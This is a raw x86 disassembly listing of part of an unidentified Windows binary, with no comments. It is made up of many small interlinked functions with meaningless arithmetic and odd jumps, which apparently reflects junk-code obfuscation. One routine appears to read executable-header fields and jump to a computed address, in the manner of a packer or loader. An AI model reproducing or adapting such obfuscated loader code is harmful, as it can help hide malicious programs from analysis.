  4d0797:	push   ecx
  4d0798:	push   esi
  4d0799:	push   DWORD PTR [ecx+0x1bc]
  4d079f:	push   edi
  4d07a0:	push   DWORD PTR [ecx+0x28]
  4d07a3:	call   0x4d1144
  4d07a8:	add    esp,0x10
  4d07ab:	pop    ecx
  4d07ac:	push   ecx
  4d07ad:	mov    esi,0x0
  4d07b2:	push   esi
  4d07b3:	call   0x4d0d34
  4d07b8:	add    esp,0x4
  4d07bb:	pop    ecx
  4d07bc:	push   ecx
  4d07bd:	push   0x0
  4d07bf:	call   0x4d15a0
  4d07c4:	add    esp,0x4
  4d07c7:	pop    ecx
  4d07c8:	add    esp,0x24
  4d07cb:	pop    ebp
  4d07cc:	ret    
  4d07cd:	add    BYTE PTR [eax],al
  4d07cf:	add    BYTE PTR [edi-0x1],bl
  4d07d2:	adc    eax,0x4d2094
  4d07d7:	call   edi
  4d07d9:	add    BYTE PTR [eax],al
  4d07db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07e1:	sub    esp,0x5c
  4d07e4:	mov    edi,0x4d31ec
  4d07e9:	mov    DWORD PTR [ebp-0x54],0x4229
  4d07f0:	push   edi
  4d07f1:	mov    ecx,0x0
  4d07f6:	push   ecx
  4d07f7:	call   0x4d0b7c
  4d07fc:	add    esp,0x4
  4d07ff:	pop    edi
  4d0800:	push   edi
  4d0801:	push   ecx
  4d0802:	push   DWORD PTR [edi+0x170]
  4d0808:	call   0x4d137c
  4d080d:	add    esp,0x8
  4d0810:	pop    edi
  4d0811:	push   edi
  4d0812:	call   0x4d0dc8
  4d0817:	add    esp,0x4
  4d081a:	pop    edi
  4d081b:	add    esp,0x5c
  4d081e:	pop    ebp
  4d081f:	ret    
  4d0820:	mov    edi,edi
  4d0822:	push   ebp
  4d0823:	mov    ebp,esp
  4d0825:	sub    esp,0x50
  4d0828:	lea    ebx,ds:0x4d300c
  4d082e:	adc    edx,edi
  4d0830:	mov    esi,0xfffffff4
  4d0835:	push   esi
  4d0836:	call   0x4d06ec
  4d083b:	add    esp,0x4
  4d083e:	push   ebx
  4d083f:	push   DWORD PTR [ebx+0x1c4]
  4d0845:	push   DWORD PTR [ebx+0x2c]
  4d0848:	push   eax
  4d0849:	call   0x4d128c
  4d084e:	add    esp,0xc
  4d0851:	pop    ebx
  4d0852:	mov    eax,0x0
  4d0857:	push   eax
  4d0858:	call   0x4d0d28
  4d085d:	add    esp,0x4
  4d0860:	add    esp,0x50
  4d0863:	pop    ebp
  4d0864:	ret    
  4d0865:	add    BYTE PTR [eax],al
  4d0867:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d086d:	sub    esp,0x28
  4d0870:	lea    eax,ds:0x4d31a4
  4d0876:	adc    edx,edi
  4d0878:	push   eax
  4d0879:	push   0xfffffff4
  4d087b:	call   0x4d06ec
  4d0880:	add    esp,0x4
  4d0883:	pop    eax
  4d0884:	push   eax
  4d0885:	push   ecx
  4d0886:	push   edx
  4d0887:	call   0x4d0f3c
  4d088c:	add    esp,0x8
  4d088f:	pop    eax
  4d0890:	push   eax
  4d0891:	mov    edx,0x0
  4d0896:	push   edx
  4d0897:	call   0x4d0ee8
  4d089c:	add    esp,0x4
  4d089f:	pop    eax
  4d08a0:	add    esp,0x28
  4d08a3:	pop    ebp
  4d08a4:	ret    
  4d08a5:	add    BYTE PTR [eax],al
  4d08a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08ad:	sub    esp,0x54
  4d08b0:	mov    edi,0x4d305c
  4d08b5:	cmp    edi,0x6cb
  4d08bb:	je     0x4d08ab
  4d08bd:	push   edi
  4d08be:	push   ecx
  4d08bf:	push   DWORD PTR [edi+0x100]
  4d08c5:	push   DWORD PTR [edi+0x198]
  4d08cb:	push   ebx
  4d08cc:	call   0x4d06f8
  4d08d1:	add    esp,0x10
  4d08d4:	pop    edi
  4d08d5:	push   edi
  4d08d6:	push   0x0
  4d08d8:	call   0x4d0d28
  4d08dd:	add    esp,0x4
  4d08e0:	pop    edi
  4d08e1:	push   edi
  4d08e2:	push   0x0
  4d08e4:	call   0x4d0cc4
  4d08e9:	add    esp,0x4
  4d08ec:	pop    edi
  4d08ed:	add    esp,0x54
  4d08f0:	pop    ebp
  4d08f1:	ret    
  4d08f2:	add    BYTE PTR [eax],al
  4d08f4:	pop    edi
  4d08f5:	call   DWORD PTR ds:0x4d2070
  4d08fb:	call   edi
  4d08fd:	add    BYTE PTR [eax],al
  4d08ff:	add    BYTE PTR [edi-0x1],bl
  4d0902:	adc    eax,0x4d204c
  4d0907:	call   edi
  4d0909:	add    BYTE PTR [eax],al
  4d090b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0911:	sub    esp,0x24
  4d0914:	mov    esi,0x4d30c4
  4d0919:	or     DWORD PTR [esi-0x64],0xb
  4d091d:	push   0x0
  4d091f:	call   0x4d0edc
  4d0924:	add    esp,0x4
  4d0927:	push   esi
  4d0928:	push   DWORD PTR [esi+0x5c]
  4d092b:	push   ecx
  4d092c:	push   edi
  4d092d:	push   ebx
  4d092e:	call   0x4d0ae8
  4d0933:	add    esp,0x10
  4d0936:	pop    esi
  4d0937:	call   0x4d0dc8
  4d093c:	add    esp,0x4
  4d093f:	add    esp,0x24
  4d0942:	pop    ebp
  4d0943:	ret    
  4d0944:	mov    edi,edi
  4d0946:	push   ebp
  4d0947:	mov    ebp,esp
  4d0949:	sub    esp,0x4c
  4d094c:	lea    ecx,ds:0x4d30b0
  4d0952:	cmp    ecx,0x1dae
  4d0958:	jb     0x4d0947
  4d095a:	push   ecx
  4d095b:	push   DWORD PTR [ecx+0x198]
  4d0961:	push   DWORD PTR [ecx+0xe8]
  4d0967:	push   DWORD PTR [ecx+0x1b4]
  4d096d:	call   0x4d0c28
  4d0972:	add    esp,0xc
  4d0975:	pop    ecx
  4d0976:	push   ecx
  4d0977:	mov    esi,0x0
  4d097c:	push   esi
  4d097d:	call   0x4d10a0
  4d0982:	add    esp,0x4
  4d0985:	pop    ecx
  4d0986:	push   ecx
  4d0987:	push   0x0
  4d0989:	call   0x4d0cc4
  4d098e:	add    esp,0x4
  4d0991:	pop    ecx
  4d0992:	add    esp,0x4c
  4d0995:	pop    ebp
  4d0996:	ret    
  4d0997:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d099d:	sub    esp,0x58
  4d09a0:	lea    ebx,ds:0x4d3174
  4d09a6:	sub    ecx,0x5d
  4d09a9:	mov    edi,0xfffffff4
  4d09ae:	push   edi
  4d09af:	call   0x4d06ec
  4d09b4:	add    esp,0x4
  4d09b7:	push   ebx
  4d09b8:	push   eax
  4d09b9:	push   DWORD PTR [ebx+0x120]
  4d09bf:	push   edx
  4d09c0:	call   0x4d0784
  4d09c5:	add    esp,0xc
  4d09c8:	pop    ebx
  4d09c9:	mov    esi,0x0
  4d09ce:	push   esi
  4d09cf:	call   0x4d10a0
  4d09d4:	add    esp,0x4
  4d09d7:	add    esp,0x58
  4d09da:	pop    ebp
  4d09db:	ret    
  4d09dc:	mov    edi,edi
  4d09de:	push   ebp
  4d09df:	mov    ebp,esp
  4d09e1:	sub    esp,0x38
  4d09e4:	mov    ecx,0x4d30a0
  4d09e9:	or     eax,DWORD PTR [ecx+0x6c]
  4d09ec:	push   ecx
  4d09ed:	mov    edx,0x0
  4d09f2:	push   edx
  4d09f3:	call   0x4d0ee8
  4d09f8:	add    esp,0x4
  4d09fb:	pop    ecx
  4d09fc:	push   ecx
  4d09fd:	push   DWORD PTR [ecx+0xf8]
  4d0a03:	push   DWORD PTR [ecx+0x118]
  4d0a09:	call   0x4d0d88
  4d0a0e:	add    esp,0x8
  4d0a11:	pop    ecx
  4d0a12:	push   ecx
  4d0a13:	lea    ebx,[ecx-0xa0]
  4d0a19:	push   ebx
  4d0a1a:	call   0x4d1364
  4d0a1f:	add    esp,0x4
  4d0a22:	test   eax,eax
  4d0a24:	jne    0x4d0a13
  4d0a26:	pop    ecx
  4d0a27:	add    esp,0x38
  4d0a2a:	pop    ebp
  4d0a2b:	ret    
  4d0a2c:	mov    edi,edi
  4d0a2e:	push   ebp
  4d0a2f:	mov    ebp,esp
  4d0a31:	sub    esp,0x2c
  4d0a34:	lea    edi,[eax-0x30]
  4d0a37:	or     DWORD PTR [ebp-0x28],0xffffff9b
  4d0a3b:	push   edi
  4d0a3c:	push   DWORD PTR [edi+0xe0]
  4d0a42:	push   DWORD PTR [edi+0x134]
  4d0a48:	push   ecx
  4d0a49:	push   DWORD PTR [edi+0x154]
  4d0a4f:	call   0x4d13c8
  4d0a54:	add    esp,0x10
  4d0a57:	pop    edi
  4d0a58:	push   edi
  4d0a59:	push   0x0
  4d0a5b:	call   0x4d0d28
  4d0a60:	add    esp,0x4
  4d0a63:	pop    edi
  4d0a64:	push   edi
  4d0a65:	push   0x0
  4d0a67:	call   0x4d0b7c
  4d0a6c:	add    esp,0x4
  4d0a6f:	pop    edi
  4d0a70:	add    esp,0x2c
  4d0a73:	pop    ebp
  4d0a74:	ret    
  4d0a75:	add    BYTE PTR [eax],al
  4d0a77:	add    BYTE PTR [edi-0x1],bl
  4d0a7a:	adc    eax,0x4d2080
  4d0a7f:	call   edi
  4d0a81:	add    BYTE PTR [eax],al
  4d0a83:	add    BYTE PTR [edi-0x1],bl
  4d0a86:	adc    eax,0x4d208c
  4d0a8b:	call   edi
  4d0a8d:	add    BYTE PTR [eax],al
  4d0a8f:	add    BYTE PTR [edi-0x1],bl
  4d0a92:	adc    eax,0x4d2068
  4d0a97:	call   edi
  4d0a99:	add    BYTE PTR [eax],al
  4d0a9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aa1:	sub    esp,0x48
  4d0aa4:	lea    eax,ds:0x4d315c
  4d0aaa:	and    DWORD PTR [ebp-0x20],eax
  4d0aad:	push   eax
  4d0aae:	lea    eax,[eax-0x15c]
  4d0ab4:	push   eax
  4d0ab5:	call   0x4d1364
  4d0aba:	add    esp,0x4
  4d0abd:	test   eax,eax
  4d0abf:	jne    0x4d0aae
  4d0ac1:	pop    eax
  4d0ac2:	push   eax
  4d0ac3:	push   ebx
  4d0ac4:	push   DWORD PTR [eax+0x20]
  4d0ac7:	call   0x4d0bec
  4d0acc:	add    esp,0x8
  4d0acf:	pop    eax
  4d0ad0:	push   eax
  4d0ad1:	mov    esi,0x0
  4d0ad6:	push   esi
  4d0ad7:	call   0x4d0b7c
  4d0adc:	add    esp,0x4
  4d0adf:	pop    eax
  4d0ae0:	add    esp,0x48
  4d0ae3:	pop    ebp
  4d0ae4:	ret    
  4d0ae5:	add    BYTE PTR [eax],al
  4d0ae7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0aed:	sub    esp,0x38
  4d0af0:	lea    edi,[esi-0x38]
  4d0af3:	cmp    edi,0x5c16
  4d0af9:	jbe    0x4d0aeb
  4d0afb:	push   edi
  4d0afc:	push   DWORD PTR [edi+0x17c]
  4d0b02:	push   ebx
  4d0b03:	call   0x4d10f0
  4d0b08:	add    esp,0x8
  4d0b0b:	pop    edi
  4d0b0c:	push   edi
  4d0b0d:	push   0x0
  4d0b0f:	call   0x4d0cc4
  4d0b14:	add    esp,0x4
  4d0b17:	pop    edi
  4d0b18:	push   edi
  4d0b19:	mov    eax,0x0
  4d0b1e:	push   eax
  4d0b1f:	call   0x4d0d28
  4d0b24:	add    esp,0x4
  4d0b27:	pop    edi
  4d0b28:	add    esp,0x38
  4d0b2b:	pop    ebp
  4d0b2c:	ret    
  4d0b2d:	add    BYTE PTR [eax],al
  4d0b2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b35:	sub    esp,0x44
  4d0b38:	lea    ebx,ds:0x4d30a8
  4d0b3e:	cmp    ebx,0x7974
  4d0b44:	jb     0x4d0b33
  4d0b46:	push   ebx
  4d0b47:	push   DWORD PTR [ebx+0x100]
  4d0b4d:	push   DWORD PTR [ebx+0x110]
  4d0b53:	push   DWORD PTR [ebx+0x104]
  4d0b59:	call   0x4d0944
  4d0b5e:	add    esp,0xc
  4d0b61:	pop    ebx
  4d0b62:	push   0x0
  4d0b64:	call   0x4d15a0
  4d0b69:	add    esp,0x4
  4d0b6c:	call   0x4d0dc8
  4d0b71:	add    esp,0x4
  4d0b74:	add    esp,0x44
  4d0b77:	pop    ebp
  4d0b78:	ret    
  4d0b79:	add    BYTE PTR [eax],al
  4d0b7b:	add    BYTE PTR [edi-0x1],bl
  4d0b7e:	adc    eax,0x4d206c
  4d0b83:	call   edi
  4d0b85:	add    BYTE PTR [eax],al
  4d0b87:	add    BYTE PTR [edi-0x1],bl
  4d0b8a:	adc    eax,0x4d2054
  4d0b8f:	call   edi
  4d0b91:	add    BYTE PTR [eax],al
  4d0b93:	add    BYTE PTR [edi-0x1],bl
  4d0b96:	adc    eax,0x4d2044
  4d0b9b:	call   edi
  4d0b9d:	add    BYTE PTR [eax],al
  4d0b9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ba5:	sub    esp,0x4c
  4d0ba8:	mov    ebx,0x4d3014
  4d0bad:	sbb    ecx,0xffffff9a
  4d0bb0:	push   ebx
  4d0bb1:	push   DWORD PTR [ebx+0x1a0]
  4d0bb7:	push   esi
  4d0bb8:	call   0x4d08a8
  4d0bbd:	add    esp,0x8
  4d0bc0:	pop    ebx
  4d0bc1:	mov    eax,0x0
  4d0bc6:	push   eax
  4d0bc7:	call   0x4d0ee8
  4d0bcc:	add    esp,0x4
  4d0bcf:	push   0x0
  4d0bd1:	call   0x4d10a0
  4d0bd6:	add    esp,0x4
  4d0bd9:	add    esp,0x4c
  4d0bdc:	pop    ebp
  4d0bdd:	ret    
  4d0bde:	add    BYTE PTR [eax],al
  4d0be0:	pop    edi
  4d0be1:	call   DWORD PTR ds:0x4d2090
  4d0be7:	call   edi
  4d0be9:	add    BYTE PTR [eax],al
  4d0beb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bf1:	sub    esp,0x20
  4d0bf4:	lea    esi,[eax+0x64]
  4d0bf7:	xor    ebx,0x33
  4d0bfa:	call   0x4d0dc8
  4d0bff:	add    esp,0x4
  4d0c02:	push   esi
  4d0c03:	push   DWORD PTR [esi+0x100]
  4d0c09:	push   DWORD PTR [esi+0x1b4]
  4d0c0f:	push   edx
  4d0c10:	call   0x4d1188
  4d0c15:	add    esp,0xc
  4d0c18:	pop    esi
  4d0c19:	call   0x4d0dc8
  4d0c1e:	add    esp,0x4
  4d0c21:	add    esp,0x20
  4d0c24:	pop    ebp
  4d0c25:	ret    
  4d0c26:	add    BYTE PTR [eax],al
  4d0c28:	mov    edi,edi
  4d0c2a:	push   ebp
  4d0c2b:	mov    ebp,esp
  4d0c2d:	sub    esp,0x34
  4d0c30:	lea    ebx,ds:0x4d312c
  4d0c36:	cmp    ebx,0x56e0
  4d0c3c:	je     0x4d0c2b
  4d0c3e:	mov    esi,0x0
  4d0c43:	push   esi
  4d0c44:	call   0x4d0d28
  4d0c49:	add    esp,0x4
  4d0c4c:	push   ebx
  4d0c4d:	push   DWORD PTR [ebx+0xe0]
  4d0c53:	push   DWORD PTR [ebx+0x34]
  4d0c56:	call   0x4d1028
  4d0c5b:	add    esp,0x8
  4d0c5e:	pop    ebx
  4d0c5f:	push   0x0
  4d0c61:	call   0x4d0d34
  4d0c66:	add    esp,0x4
  4d0c69:	add    esp,0x34
  4d0c6c:	pop    ebp
  4d0c6d:	ret    
  4d0c6e:	add    BYTE PTR [eax],al
  4d0c70:	pop    edi
  4d0c71:	call   DWORD PTR ds:0x4d2004
  4d0c77:	call   edi
  4d0c79:	add    BYTE PTR [eax],al
  4d0c7b:	add    BYTE PTR [edi+0x2b],dl
  4d0c7e:	call   DWORD PTR [edi+0x57]
  4d0c81:	push   edi
  4d0c82:	push   edi
  4d0c83:	call   0x4d0dc8
  4d0c88:	sub    esp,0xfffffffc
  4d0c8b:	call   0x4d1370
  4d0c90:	push   0x2
  4d0c92:	xor    eax,eax
  4d0c94:	sub    eax,0x4d3030
  4d0c99:	neg    eax
  4d0c9b:	push   0x0
  4d0c9d:	lea    ecx,[eax+0x7]
  4d0ca0:	add    BYTE PTR [ecx],0x41
  4d0ca3:	push   eax
  4d0ca4:	call   0x4d0900
  4d0ca9:	pop    edi
  4d0caa:	pop    edi
  4d0cab:	pop    edi
  4d0cac:	lea    ecx,[eax+0x3b]
  4d0caf:	mov    edi,DWORD PTR [ecx]
  4d0cb1:	lea    eax,[eax+edi*1]
  4d0cb4:	mov    eax,DWORD PTR [eax+0x28]
  4d0cb7:	pusha  
  4d0cb8:	mov    ah,0x45
  4d0cba:	sub    al,ah
  4d0cbc:	ja     0x4d073c
  4d0cc2:	popa   
  4d0cc3:	ret    
  4d0cc4:	pop    edi
  4d0cc5:	call   DWORD PTR ds:0x4d202c
  4d0ccb:	call   edi
  4d0ccd:	add    BYTE PTR [eax],al
  4d0ccf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cd5:	sub    esp,0x1c
  4d0cd8:	lea    ebx,[ecx+0xcc]
  4d0cde:	mov    edx,0x3dbf
  4d0ce3:	mov    edx,0x0
  4d0ce8:	push   edx
  4d0ce9:	call   0x4d15a0
  4d0cee:	add    esp,0x4
  4d0cf1:	push   ebx
  4d0cf2:	push   DWORD PTR [ebx+0x38]
  4d0cf5:	push   DWORD PTR [ebx+0xa4]
  4d0cfb:	push   DWORD PTR [ebx+0x160]
  4d0d01:	call   0x4d131c
  4d0d06:	add    esp,0xc
  4d0d09:	pop    ebx
  4d0d0a:	push   0x0
  4d0d0c:	call   0x4d1594
  4d0d11:	add    esp,0x4
  4d0d14:	add    esp,0x1c
  4d0d17:	pop    ebp
  4d0d18:	ret    
  4d0d19:	add    BYTE PTR [eax],al
  4d0d1b:	add    BYTE PTR [edi-0x1],bl
  4d0d1e:	adc    eax,0x4d2064
  4d0d23:	call   edi
  4d0d25:	add    BYTE PTR [eax],al
  4d0d27:	add    BYTE PTR [edi-0x1],bl
  4d0d2a:	adc    eax,0x4d2078
  4d0d2f:	call   edi
  4d0d31:	add    BYTE PTR [eax],al
  4d0d33:	add    BYTE PTR [edi-0x1],bl
  4d0d36:	adc    eax,0x4d2028
  4d0d3b:	call   edi
  4d0d3d:	add    BYTE PTR [eax],al
  4d0d3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d45:	sub    esp,0x54
  4d0d48:	mov    eax,0x4d318c
  4d0d4d:	sbb    DWORD PTR [eax-0x30],0x3
  4d0d51:	push   eax
  4d0d52:	push   DWORD PTR [eax+0x148]
  4d0d58:	push   edx
  4d0d59:	push   ecx
  4d0d5a:	push   esi
  4d0d5b:	call   0x4d12e0
  4d0d60:	add    esp,0x10
  4d0d63:	pop    eax
  4d0d64:	push   eax
  4d0d65:	push   0x0
  4d0d67:	call   0x4d0ee8
  4d0d6c:	add    esp,0x4
  4d0d6f:	pop    eax
  4d0d70:	push   eax
  4d0d71:	mov    ebx,0x0
  4d0d76:	push   ebx
  4d0d77:	call   0x4d0b7c
  4d0d7c:	add    esp,0x4
  4d0d7f:	pop    eax
  4d0d80:	add    esp,0x54
  4d0d83:	pop    ebp
  4d0d84:	ret    
  4d0d85:	add    BYTE PTR [eax],al
  4d0d87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d8d:	sub    esp,0x2c
  4d0d90:	mov    esi,0x4d30bc
  4d0d95:	or     eax,0x223e
  4d0d9a:	push   esi
  4d0d9b:	push   DWORD PTR [esi+0x160]
  4d0da1:	push   DWORD PTR [esi+0x1fc]
  4d0da7:	call   0x4d0fec
  4d0dac:	add    esp,0x8
  4d0daf:	pop    esi
  4d0db0:	call   0x4d0dc8
  4d0db5:	add    esp,0x4
  4d0db8:	push   0x0
  4d0dba:	call   0x4d0cc4
  4d0dbf:	add    esp,0x4
  4d0dc2:	add    esp,0x2c
  4d0dc5:	pop    ebp
  4d0dc6:	ret    
  4d0dc7:	add    BYTE PTR [edi-0x1],bl
  4d0dca:	adc    eax,0x4d2014
  4d0dcf:	call   edi
  4d0dd1:	add    BYTE PTR [eax],al
  4d0dd3:	add    BYTE PTR [edi-0x1],bl
  4d0dd6:	adc    eax,0x4d2010
  4d0ddb:	call   edi
  4d0ddd:	add    BYTE PTR [eax],al
  4d0ddf:	add    BYTE PTR [edi-0x1],bl
  4d0de2:	adc    eax,0x4d20a0
  4d0de7:	call   edi
  4d0de9:	add    BYTE PTR [eax],al
  4d0deb:	add    BYTE PTR [edi-0x1],bl
  4d0dee:	adc    eax,0x4d2024
  4d0df3:	call   edi
  4d0df5:	add    BYTE PTR [eax],al
  4d0df7:	add    BYTE PTR [edi-0x1],bl
  4d0dfa:	adc    eax,0x4d2060
  4d0dff:	call   edi
  4d0e01:	add    BYTE PTR [eax],al
  4d0e03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e09:	sub    esp,0x30
  4d0e0c:	lea    ebx,ds:0x4d3194
  4d0e12:	mov    edx,DWORD PTR [ebp-0x14]
  4d0e15:	push   ebx
  4d0e16:	push   DWORD PTR [ebx+0x68]
  4d0e19:	push   DWORD PTR [ebx+0xcc]
  4d0e1f:	push   ecx
  4d0e20:	push   ecx
  4d0e21:	call   0x4d0868
  4d0e26:	add    esp,0x10
  4d0e29:	pop    ebx
  4d0e2a:	call   0x4d0dc8
  4d0e2f:	add    esp,0x4
  4d0e32:	mov    edi,0x0
  4d0e37:	push   edi
  4d0e38:	call   0x4d12d4
  4d0e3d:	add    esp,0x4
  4d0e40:	add    esp,0x30
  4d0e43:	pop    ebp
  4d0e44:	ret    
  4d0e45:	add    BYTE PTR [eax],al
  4d0e47:	add    BYTE PTR [edi-0x1],bl
  4d0e4a:	adc    eax,0x4d2034
  4d0e4f:	call   edi
  4d0e51:	add    BYTE PTR [eax],al
  4d0e53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e59:	sub    esp,0x24
  4d0e5c:	lea    ecx,ds:0x4d31c0
  4d0e62:	mov    DWORD PTR [ebp-0x20],0x2b
  4d0e69:	push   ecx
  4d0e6a:	push   edx
  4d0e6b:	push   DWORD PTR [ecx+0x8]
  4d0e6e:	push   esi
  4d0e6f:	push   esi
  4d0e70:	call   0x4d0d40
  4d0e75:	add    esp,0x10
  4d0e78:	pop    ecx
  4d0e79:	push   ecx
  4d0e7a:	push   0x0
  4d0e7c:	call   0x4d12d4
  4d0e81:	add    esp,0x4
  4d0e84:	pop    ecx
  4d0e85:	push   ecx
  4d0e86:	call   0x4d0dd4
  4d0e8b:	add    esp,0x4
  4d0e8e:	pop    ecx
  4d0e8f:	add    esp,0x24
  4d0e92:	pop    ebp
  4d0e93:	ret    
  4d0e94:	mov    edi,edi
  4d0e96:	push   ebp
  4d0e97:	mov    ebp,esp
  4d0e99:	sub    esp,0x48
  4d0e9c:	lea    ecx,[ebx+0xd4]
  4d0ea2:	or     DWORD PTR [ecx-0xf0],ebx
  4d0ea8:	push   ecx
  4d0ea9:	push   0x0
  4d0eab:	call   0x4d0b7c
  4d0eb0:	add    esp,0x4
  4d0eb3:	pop    ecx
  4d0eb4:	push   ecx
  4d0eb5:	push   DWORD PTR [ecx+0x1e0]
  4d0ebb:	push   DWORD PTR [ecx+0x1ac]
  4d0ec1:	call   0x4d11f0
  4d0ec6:	add    esp,0x8
  4d0ec9:	pop    ecx
  4d0eca:	push   ecx
  4d0ecb:	push   0x0
  4d0ecd:	call   0x4d0ee8
  4d0ed2:	add    esp,0x4
  4d0ed5:	pop    ecx
  4d0ed6:	add    esp,0x48
  4d0ed9:	pop    ebp
  4d0eda:	ret    
  4d0edb:	add    BYTE PTR [edi-0x1],bl
  4d0ede:	adc    eax,0x4d2000
  4d0ee3:	call   edi
  4d0ee5:	add    BYTE PTR [eax],al
  4d0ee7:	add    BYTE PTR [edi-0x1],bl
  4d0eea:	adc    eax,0x4d203c
  4d0eef:	call   edi
  4d0ef1:	add    BYTE PTR [eax],al
  4d0ef3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ef9:	sub    esp,0x60
  4d0efc:	lea    eax,[ecx-0x160]
  4d0f02:	or     ebx,DWORD PTR [eax+0xcc]
  4d0f08:	push   eax
  4d0f09:	call   0x4d11e4
  4d0f0e:	add    esp,0x4
  4d0f11:	pop    eax
  4d0f12:	push   eax
  4d0f13:	push   DWORD PTR [eax+0x1e4]
  4d0f19:	push   DWORD PTR [eax+0x120]
  4d0f1f:	push   edx
  4d0f20:	call   0x4d0a2c
  4d0f25:	add    esp,0xc
  4d0f28:	pop    eax
  4d0f29:	push   eax
  4d0f2a:	push   0x0
  4d0f2c:	call   0x4d0d34
  4d0f31:	add    esp,0x4
  4d0f34:	pop    eax
  4d0f35:	add    esp,0x60
  4d0f38:	pop    ebp
  4d0f39:	ret    
  4d0f3a:	add    BYTE PTR [eax],al
  4d0f3c:	mov    edi,edi
  4d0f3e:	push   ebp
  4d0f3f:	mov    ebp,esp
  4d0f41:	sub    esp,0x38
  4d0f44:	lea    ecx,[eax-0x30]
  4d0f47:	xor    eax,DWORD PTR [ecx-0xb8]
  4d0f4d:	push   ecx
  4d0f4e:	mov    esi,0xfffffff4
  4d0f53:	push   esi
  4d0f54:	call   0x4d06ec
  4d0f59:	add    esp,0x4
  4d0f5c:	pop    ecx
  4d0f5d:	push   ecx
  4d0f5e:	push   edi
  4d0f5f:	push   DWORD PTR [ecx+0x124]
  4d0f65:	push   esi
  4d0f66:	push   DWORD PTR [ecx+0x144]
  4d0f6c:	call   0x4d14a8
  4d0f71:	add    esp,0x10
  4d0f74:	pop    ecx
  4d0f75:	push   ecx
  4d0f76:	call   0x4d11e4
  4d0f7b:	add    esp,0x4
  4d0f7e:	pop    ecx
  4d0f7f:	add    esp,0x38
  4d0f82:	pop    ebp
  4d0f83:	ret    
  4d0f84:	pop    edi
  4d0f85:	call   DWORD PTR ds:0x4d2098
  4d0f8b:	call   edi
  4d0f8d:	add    BYTE PTR [eax],al
  4d0f8f:	add    BYTE PTR [edi-0x1],bl
  4d0f92:	adc    eax,0x4d209c
  4d0f97:	call   edi
  4d0f99:	add    BYTE PTR [eax],al
  4d0f9b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fa1:	sub    esp,0x24
  4d0fa4:	lea    edx,[esi+0x58]
  4d0fa7:	mov    edi,DWORD PTR [edx-0xa4]
  4d0fad:	push   edx
  4d0fae:	push   DWORD PTR [edx+0x9c]
  4d0fb4:	push   edi
  4d0fb5:	push   DWORD PTR [edx+0x80]
  4d0fbb:	call   0x4d0e04
  4d0fc0:	add    esp,0xc
  4d0fc3:	pop    edx
  4d0fc4:	push   edx
  4d0fc5:	call   0x4d11e4
  4d0fca:	add    esp,0x4
  4d0fcd:	pop    edx
  4d0fce:	push   edx
  4d0fcf:	push   0x0
  4d0fd1:	call   0x4d0d34
  4d0fd6:	add    esp,0x4
  4d0fd9:	pop    edx
  4d0fda:	add    esp,0x24
  4d0fdd:	pop    ebp
  4d0fde:	ret    
  4d0fdf:	add    BYTE PTR [edi-0x1],bl
  4d0fe2:	adc    eax,0x4d2020
  4d0fe7:	call   edi
  4d0fe9:	add    BYTE PTR [eax],al
  4d0feb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ff1:	sub    esp,0x50
  4d0ff4:	lea    ebx,ds:0x4d315c
  4d0ffa:	sbb    edx,DWORD PTR [ebp-0x34]
  4d0ffd:	push   ebx
  4d0ffe:	push   edi
  4d0fff:	push   DWORD PTR [ebx+0x1d0]
  4d1005:	call   0x4d10ac
  4d100a:	add    esp,0x8
  4d100d:	pop    ebx
  4d100e:	push   0x0
  4d1010:	call   0x4d12d4
  4d1015:	add    esp,0x4
  4d1018:	push   0x0
  4d101a:	call   0x4d1594
  4d101f:	add    esp,0x4
  4d1022:	add    esp,0x50
  4d1025:	pop    ebp
  4d1026:	ret    
  4d1027:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d102d:	sub    esp,0x48
  4d1030:	lea    eax,ds:0x4d31ac
  4d1036:	adc    ecx,esi
  4d1038:	push   eax
  4d1039:	call   0x4d0dc8
  4d103e:	add    esp,0x4
  4d1041:	pop    eax
  4d1042:	push   eax
  4d1043:	push   ecx
  4d1044:	push   DWORD PTR [eax+0xe4]
  4d104a:	push   edx
  4d104b:	push   esi
  4d104c:	call   0x4d0820
  4d1051:	add    esp,0x10
  4d1054:	pop    eax
  4d1055:	push   eax
  4d1056:	call   0x4d0dd4
  4d105b:	add    esp,0x4
  4d105e:	pop    eax
  4d105f:	add    esp,0x48
  4d1062:	pop    ebp
  4d1063:	ret    
  4d1064:	mov    edi,edi
  4d1066:	push   ebp
  4d1067:	mov    ebp,esp
  4d1069:	sub    esp,0x3c
  4d106c:	mov    ebx,0x4d3020
  4d1071:	add    DWORD PTR [ebp-0x2c],0x2a
  4d1075:	push   ebx
  4d1076:	push   edi
  4d1077:	push   ecx
  4d1078:	call   0x4d153c
  4d107d:	add    esp,0x8
  4d1080:	pop    ebx
  4d1081:	call   0x4d0dd4
  4d1086:	add    esp,0x4
  4d1089:	lea    esi,[ebx-0x20]
  4d108c:	push   esi
  4d108d:	call   0x4d1364
  4d1092:	add    esp,0x4
  4d1095:	test   eax,eax
  4d1097:	jne    0x4d108a
  4d1099:	add    esp,0x3c
  4d109c:	pop    ebp
  4d109d:	ret    
  4d109e:	add    BYTE PTR [eax],al
  4d10a0:	pop    edi
  4d10a1:	call   DWORD PTR ds:0x4d2048
  4d10a7:	call   edi
  4d10a9:	add    BYTE PTR [eax],al
  4d10ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10b1:	sub    esp,0x4c
  4d10b4:	lea    edx,[ebx-0xbc]
  4d10ba:	cmp    edx,0x179f
  4d10c0:	je     0x4d10af
  4d10c2:	push   edx
  4d10c3:	push   0x0
